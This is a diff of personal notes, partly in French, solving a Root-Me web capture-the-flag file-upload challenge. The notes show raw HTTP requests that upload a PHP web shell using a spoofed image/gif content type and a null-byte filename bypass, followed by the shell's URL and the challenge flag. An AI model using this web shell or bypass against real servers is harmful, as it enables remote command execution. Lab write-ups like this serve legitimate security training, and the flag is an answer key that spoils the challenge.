@@ -1,23 +1,61 @@
 POST /web-serveur/ch22/?action=upload HTTP/1.1
 Host: challenge01.root-me.org
-Content-Length: 225
+Content-Length: 217
 Cache-Control: max-age=0
-Origin: http://challenge01.root-me.org
 Upgrade-Insecure-Requests: 1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ZFWQ2qwhBHeQUUq
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Origin: http://challenge01.root-me.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh7QSC5vhXmIwiCOe
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload
 Accept-Encoding: gzip, deflate
 Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=ndh7prqj4bpnaeiofas3e01k51
+Cookie: PHPSESSID=pvgikkf8ldhagpipnkpti3m3l4; passwd=test; status=adm
 Connection: close
 
-------WebKitFormBoundary2ZFWQ2qwhBHeQUUq
+------WebKitFormBoundaryh7QSC5vhXmIwiCOe
 Content-Disposition: form-data; name="file"; filename="inject.php"
-Content-Type: application/x-php
+Content-Type: image/gif
 
 <?php
 system($_GET['command']);
 ?>
-------WebKitFormBoundary2ZFWQ2qwhBHeQUUq--
+------WebKitFormBoundaryh7QSC5vhXmIwiCOe--
+
+
+Renvoie wrong extension
+
+
+
+POST /web-serveur/ch22/?action=upload HTTP/1.1
+Host: challenge01.root-me.org
+Content-Length: 224
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://challenge01.root-me.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUzwtiZX2tAxorfK7
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=pvgikkf8ldhagpipnkpti3m3l4; passwd=test; status=adm
+Connection: close
+
+------WebKitFormBoundaryUzwtiZX2tAxorfK7
+Content-Disposition: form-data; name="file"; filename="inject.php%00.jpg"
+Content-Type: image/gif
+
+<?php
+system($_GET['command']);
+?>
+------WebKitFormBoundaryUzwtiZX2tAxorfK7--
+
+
+
+ ./galerie/upload/pvgikkf8ldhagpipnkpti3m3l4/inject.php%00.jpg
+
+ Puis visiter l'URL : http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/pvgikkf8ldhagpipnkpti3m3l4/inject.php
+
+
+ flag: YPNchi2NmTwygr2dgCCF
